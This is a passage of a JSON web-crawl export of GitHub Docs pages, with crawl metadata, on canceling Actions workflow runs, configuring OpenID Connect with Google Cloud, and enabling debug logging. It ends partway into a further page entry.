period, the server will force terminate all jobs and steps that don't finish running or fail to complete the cancellation process.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-canceling-a-workflow-1u02e.html",
  "markdown": "# Canceling a workflow - GitHub Docs\n\nYou can cancel a workflow run that is in progress. When you cancel a workflow run, GitHub cancels all jobs and steps that are a part of that workflow.\n\n## In this article\n\nWrite access to the repository is required to perform these steps.\n\n## [Canceling a workflow run](#canceling-a-workflow-run)\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  From the list of workflow runs, click the name of the `queued` or `in progress` run that you want to cancel.\n    \n5.  In the upper-right corner of the workflow, click **Cancel workflow**.\n    \n    ![Screenshot showing the summary for a workflow that is currently running. The \"Cancel workflow\" button is highlighted with a dark orange outline.](https://docs.github.com/assets/cb-35999/images/help/repository/cancel-check-suite-updated.png)\n    \n\n## [Steps GitHub takes to cancel a workflow run](#steps-github-takes-to-cancel-a-workflow-run)\n\nWhen canceling workflow run, you may be running other software that uses resources that are related to the workflow run. To help you free up resources related to the workflow run, it may help to understand the steps GitHub performs to cancel a workflow run.\n\n1.  To cancel the workflow run, the server re-evaluates `if` conditions for all currently running jobs. If the condition evaluates to `true`, the job will not get canceled. For example, the condition `if: always()` would evaluate to true and the job continues to run. When there is no condition, that is the equivalent of the condition `if: success()`, which only runs if the previous step finished successfully.\n2.  For jobs that need to be canceled, the server sends a cancellation message to all the runner machines with jobs that need to be canceled.\n3.  For jobs that continue to run, the server re-evaluates `if` conditions for the unfinished steps. If the condition evaluates to `true`, the step continues to run. You can use the `cancelled` expression to apply a status check of `cancelled()`. For more information see [Evaluate expressions in workflows and actions](https://docs.github.com/en/actions/learn-github-actions/expressions#cancelled).\n4.  For steps that need to be canceled, the runner machine sends `SIGINT/Ctrl-C` to the step's entry process (`node` for javascript action, `docker` for container action, and `bash/cmd/pwd` when using `run` in a step). If the process doesn't exit within 7500 ms, the runner will send `SIGTERM/Ctrl-Break` to the process, then wait for 2500 ms for the process to exit. If the process is still running, the runner kills the process tree.\n5.  After the 5 minutes cancellation timeout period, the server will force terminate all jobs and steps that don't finish running or fail to complete the cancellation process.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 232,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-canceling-a-workflow-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-canceling-a-workflow-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-canceling-a-workflow-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-canceling-a-workflow-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-canceling-a-workflow-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 4700,
      "readableText": 4707,
      "none": 24513,
      "readableTextIfPossible": 24513,
      "result": 4707,
      "markdown": 3327
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform",
    "loadedTime": "2025-05-08T06:38:45.408Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform",
    "title": "Configuring OpenID Connect in Google Cloud Platform - GitHub Docs",
    "description": "Use OpenID Connect within your workflows to authenticate with Google Cloud Platform.",
    "author": null,
    "keywords": "Security",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Configuring OpenID Connect in Google Cloud Platform - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "208A:56D02:8B614E:B78644:681C1EAE",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "12954",
      "date": "Thu, 08 May 2025 06:38:39 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686319.043508, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28479",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Configuring OpenID Connect in Google Cloud Platform\nUse OpenID Connect within your workflows to authenticate with Google Cloud Platform.\nOverview\nOpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in Google Cloud Platform (GCP), without needing to store the GCP credentials as long-lived GitHub secrets.\nThis guide gives an overview of how to configure GCP to trust GitHub's OIDC as a federated identity, and includes a workflow example for the google-github-actions/auth action that uses tokens to authenticate to GCP and access resources.\nPrerequisites\nTo learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see About security hardening with OpenID Connect.\nBefore proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you must define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see About security hardening with OpenID Connect.\nAdding a Google Cloud Workload Identity Provider\nTo configure the OIDC identity provider in GCP, you will need to perform the following configuration. For instructions on making these changes, refer to the GCP documentation.\nCreate a new identity pool.\nConfigure the mapping and add conditions.\nConnect the new pool to a service account.\nAdditional guidance for configuring the identity provider:\nFor security hardening, make sure you've reviewed Configuring the OIDC trust with the cloud. For an example, see Configuring the subject in your cloud provider.\nFor the service account to be available for configuration, it needs to be assigned to the roles/iam.workloadIdentityUser role. For more information, see the GCP documentation.\nThe Issuer URL to use: https://token.actions.githubusercontent.com\nUpdating your GitHub Actions workflow\nTo update your workflows for OIDC, you will need to make two changes to your YAML:\nAdd permissions settings for the token.\nUse the google-github-actions/auth action to exchange the OIDC token (JWT) for a cloud access token.\nNote\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see Managing environments for deployment.\nAdding permissions settings\nThe job or workflow run requires a permissions setting with id-token: write to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the permissions for id-token is not set to write, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see About security hardening with OpenID Connect.\nThe id-token: write setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\nUsing environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URL and ACTIONS_ID_TOKEN_REQUEST_TOKEN).\nUsing getIDToken() from the Actions toolkit.\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT contents: read # This is required for actions/checkout \nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT \nYou may need to specify additional permissions here, depending on your workflow's requirements.\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the permissions setting for id-token should be explicitly set to write at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\nFor more information, see Reusing workflows.\nRequesting the access token\nThe google-github-actions/auth action receives a JWT from the GitHub OIDC provider, and then requests an access token from GCP. For more information, see the GCP documentation.\nThis example has a job called Get_OIDC_ID_token that uses actions to request a list of services from GCP.\nWORKLOAD-IDENTITY-PROVIDER: Replace this with the path to your identity provider in GCP. For example, projects/example-project-id/locations/global/workloadIdentityPools/name-of-pool/providers/name-of-provider\nSERVICE-ACCOUNT: Replace this with the name of your service account in GCP.\nThis action exchanges a GitHub OIDC token for a Google Cloud access token, using Workload Identity Federation.\nYAML\nname: List services in GCP on: pull_request: branches: - main permissions: id-token: write jobs: Get_OIDC_ID_token: runs-on: ubuntu-latest steps: - id: 'auth' name: 'Authenticate to GCP' uses: 'google-github-actions/auth@f1e2d3c4b5a6f7e8d9c0b1a2c3d4e5f6a7b8c9d0' with: create_credentials_file: 'true' workload_identity_provider: 'WORKLOAD-IDENTITY-PROVIDER' service_account: 'SERVICE-ACCOUNT' - id: 'gcloud' name: 'gcloud' run: |- gcloud auth login --brief --cred-file=\"${{ steps.auth.outputs.credentials_file_path }}\" gcloud services list \nFurther reading\nUsing OpenID Connect with reusable workflows\nCommunicating with self-hosted runners",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-google-cloud-platform-vi451.html",
  "markdown": "# Configuring OpenID Connect in Google Cloud Platform\n\nUse OpenID Connect within your workflows to authenticate with Google Cloud Platform.\n\n## [Overview](#overview)\n\nOpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in Google Cloud Platform (GCP), without needing to store the GCP credentials as long-lived GitHub secrets.\n\nThis guide gives an overview of how to configure GCP to trust GitHub's OIDC as a federated identity, and includes a workflow example for the [`google-github-actions/auth`](https://github.com/google-github-actions/auth) action that uses tokens to authenticate to GCP and access resources.\n\n## [Prerequisites](#prerequisites)\n\n*   To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n    \n*   Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you **must** define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n    \n\n## [Adding a Google Cloud Workload Identity Provider](#adding-a-google-cloud-workload-identity-provider)\n\nTo configure the OIDC identity provider in GCP, you will need to perform the following configuration. For instructions on making these changes, refer to [the GCP documentation](https://github.com/google-github-actions/auth).\n\n1.  Create a new identity pool.\n2.  Configure the mapping and add conditions.\n3.  Connect the new pool to a service account.\n\nAdditional guidance for configuring the identity provider:\n\n*   For security hardening, make sure you've reviewed [Configuring the OIDC trust with the cloud](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud). For an example, see [Configuring the subject in your cloud provider](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-subject-in-your-cloud-provider).\n*   For the service account to be available for configuration, it needs to be assigned to the `roles/iam.workloadIdentityUser` role. For more information, see [the GCP documentation](https://cloud.google.com/iam/docs/workload-identity-federation?_ga=2.114275588.-285296507.1634918453#conditions).\n*   The Issuer URL to use: `https://token.actions.githubusercontent.com`\n\n## [Updating your GitHub Actions workflow](#updating-your-github-actions-workflow)\n\nTo update your workflows for OIDC, you will need to make two changes to your YAML:\n\n1.  Add permissions settings for the token.\n2.  Use the [`google-github-actions/auth`](https://github.com/google-github-actions/auth) action to exchange the OIDC token (JWT) for a cloud access token.\n\nNote\n\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment#deployment-protection-rules).\n\n### [Adding permissions settings](#adding-permissions-settings)\n\nThe job or workflow run requires a `permissions` setting with [`id-token: write`](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token) to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the `permissions` for `id-token` is not set to `write`, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n\nThe `id-token: write` setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\n\n*   Using environment variables on the runner (`ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN`).\n*   Using `getIDToken()` from the Actions toolkit.\n\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout\n```\n\nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n```\n\nYou may need to specify additional permissions here, depending on your workflow's requirements.\n\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the `permissions` setting for `id-token` should be explicitly set to `write` at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\n\nFor more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\n### [Requesting the access token](#requesting-the-access-token)\n\nThe `google-github-actions/auth` action receives a JWT from the GitHub OIDC provider, and then requests an access token from GCP. For more information, see the GCP [documentation](https://github.com/google-github-actions/auth).\n\nThis example has a job called `Get_OIDC_ID_token` that uses actions to request a list of services from GCP.\n\n*   `WORKLOAD-IDENTITY-PROVIDER`: Replace this with the path to your identity provider in GCP. For example, `projects/example-project-id/locations/global/workloadIdentityPools/name-of-pool/providers/name-of-provider`\n*   `SERVICE-ACCOUNT`: Replace this with the name of your service account in GCP.\n\nThis action exchanges a GitHub OIDC token for a Google Cloud access token, using [Workload Identity Federation](https://cloud.google.com/iam/docs/workload-identity-federation).\n\nYAML\n\n```\nname: List services in GCP\non:\n  pull_request:\n    branches:\n      - main\n\npermissions:\n  id-token: write\n\njobs:\n  Get_OIDC_ID_token:\n    runs-on: ubuntu-latest\n    steps:\n    - id: 'auth'\n      name: 'Authenticate to GCP'\n      uses: 'google-github-actions/auth@f1e2d3c4b5a6f7e8d9c0b1a2c3d4e5f6a7b8c9d0'\n      with:\n          create_credentials_file: 'true'\n          workload_identity_provider: 'WORKLOAD-IDENTITY-PROVIDER'\n          service_account: 'SERVICE-ACCOUNT'\n    - id: 'gcloud'\n      name: 'gcloud'\n      run: |-\n        gcloud auth login --brief --cred-file=\"${{ steps.auth.outputs.credentials_file_path }}\"\n        gcloud services list\n```\n\n## [Further reading](#further-reading)\n\n*   [Using OpenID Connect with reusable workflows](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows)\n*   [Communicating with self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/communicating-with-self-hosted-runners)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 255,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-google-cloud-platform",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-google-cloud-platform",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-google-cloud-platform",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-google-cloud-platform",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-google-cloud-platform"
    },
    "lengths": {
      "extractus": 11455,
      "readableText": 10425,
      "none": 34410,
      "readableTextIfPossible": 10425,
      "result": 10425,
      "markdown": 8282
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging",
    "loadedTime": "2025-05-08T06:38:49.528Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging",
    "title": "Enabling debug logging - GitHub Docs",
    "description": "If the workflow logs do not provide enough detail to diagnose why a workflow, job, or step is not working as expected, you can enable additional debug logging.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Enabling debug logging - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "C7EE:3C99E:EEA827:1376C6B:681C5173",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:44 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686324.911872, VS0, VE233",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "24961",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Enabling debug logging - GitHub Docs\nIf the workflow logs do not provide enough detail to diagnose why a workflow, job, or step is not working as expected, you can enable additional debug logging.\nThese extra logs are enabled by setting secrets or variables in the repository containing the workflow, so the same permissions requirements will apply:\nTo create secrets or variables on GitHub for a personal account repository, you must be the repository owner. To create secrets or variables on GitHub for an organization repository, you must have admin access. Lastly, to create secrets or variables for a personal account repository or an organization repository through the REST API, you must have collaborator access.\nTo create secrets or variables for an environment in a personal account repository, you must be the repository owner. To create secrets or variables for an environment in an organization repository, you must have admin access. For more information on environments, see Managing environments for deployment.\nOrganization owners can create secrets or variables at the organization level.\nFor more information on setting secrets and variables, see Using secrets in GitHub Actions and Store information in variables.\nAdditionally, anyone who has access to run a workflow can enable runner diagnostic logging and step debug logging for a workflow re-run. For more information, see Re-running workflows and jobs.\nEnabling runner diagnostic logging\nRunner diagnostic logging provides additional log files that contain information about how a runner is executing a job. Two extra log files are added to the log archive:\nThe runner process log, which includes information about coordinating and setting up runners to execute jobs.\nThe worker process log, which logs the execution of a job.\nTo enable runner diagnostic logging, set the following secret or variable in the repository that contains the workflow: ACTIONS_RUNNER_DEBUG to true. If both the secret and variable are set, the value of the secret takes precedence over the variable.\nTo download runner diagnostic logs, download the log archive of the workflow run. The runner diagnostic logs are contained in the runner-diagnostic-logs folder. For more information on downloading logs, see Using workflow run logs.\nEnabling step debug logging\nStep debug logging increases the verbosity of a job's logs during and after a job's execution.\nTo enable step debug logging, set the following secret or variable in the repository that contains the workflow: ACTIONS_STEP_DEBUG to true. If both the secret and variable are set, the value of the secret takes precedence over the variable.\nAfter setting the secret or variable, more debug events are shown in the step logs. For more information, see Using workflow run logs.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-enabling-debug-logging-0yu7xk.html",
  "markdown": "# Enabling debug logging - GitHub Docs\n\nIf the workflow logs do not provide enough detail to diagnose why a workflow, job, or step is not working as expected, you can enable additional debug logging.\n\nThese extra logs are enabled by setting secrets or variables in the repository containing the workflow, so the same permissions requirements will apply:\n\n*   To create secrets or variables on GitHub for a personal account repository, you must be the repository owner. To create secrets or variables on GitHub for an organization repository, you must have `admin` access. Lastly, to create secrets or variables for a personal account repository or an organization repository through the REST API, you must have collaborator access.\n*   To create secrets or variables for an environment in a personal account repository, you must be the repository owner. To create secrets or variables for an environment in an organization repository, you must have `admin` access. For more information on environments, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment).\n*   Organization owners can create secrets or variables at the organization level.\n\nFor more information on setting secrets and variables, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions) and [Store information in variables](https://docs.github.com/en/actions/learn-github-actions/variables).\n\nAdditionally, anyone who has access to run a workflow can enable runner diagnostic logging and step debug logging for a workflow re-run. For more information, see [Re-running workflows and jobs](https://docs.github.com/en/actions/managing-workflow-runs/re-running-workflows-and-jobs).\n\n## [Enabling runner diagnostic logging](#enabling-runner-diagnostic-logging)\n\nRunner diagnostic logging provides additional log files that contain information about how a runner is executing a job. Two extra log files are added to the log archive:\n\n*   The runner process log, which includes information about coordinating and setting up runners to execute jobs.\n*   The worker process log, which logs the execution of a job.\n\n1.  To enable runner diagnostic logging, set the following secret or variable in the repository that contains the workflow: `ACTIONS_RUNNER_DEBUG` to `true`. If both the secret and variable are set, the value of the secret takes precedence over the variable.\n2.  To download runner diagnostic logs, download the log archive of the workflow run. The runner diagnostic logs are contained in the `runner-diagnostic-logs` folder. For more information on downloading logs, see [Using workflow run logs](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/using-workflow-run-logs#downloading-logs).\n\n## [Enabling step debug logging](#enabling-step-debug-logging)\n\nStep debug logging increases the verbosity of a job's logs during and after a job's execution.\n\n1.  To enable step debug logging, set the following secret or variable in the repository that contains the workflow: `ACTIONS_STEP_DEBUG` to `true`. If both the secret and variable are set, the value of the secret takes precedence over the variable.\n2.  After setting the secret or variable, more debug events are shown in the step logs. For more information, see [Using workflow run logs](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/using-workflow-run-logs#viewing-logs-to-diagnose-failures).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 237,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-enabling-debug-logging-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-enabling-debug-logging-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-enabling-debug-logging-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-enabling-debug-logging-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-enabling-debug-logging-readableTextIfPossibleHtm"
    },
    "lengths": {
      "extractus": 4274,
      "readableText": 4148,
      "none": 24168,
      "readableTextIfPossible": 24168,
      "result": 4148,
      "markdown": 3547
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/commenting-on-an-issue-when-a-label-is-added",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/commenting-on-an-issue-when-a-label-is-added",
    "loadedTime": "2025-05-08T06:39:56.923Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/commenting-on-an-issue-when-a-label-is-added",
    "title": "Commenting on an issue when a label is added - GitHub Docs",
    "description": "You can use GitHub Actions to automatically comment on issues when a specific label is applied.",
    "author": null,
    "keywords": "Workflows,Project management",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Commenting on an issue when a label is added - GitHub Docs"
      },
      {
        "property": "og:type",
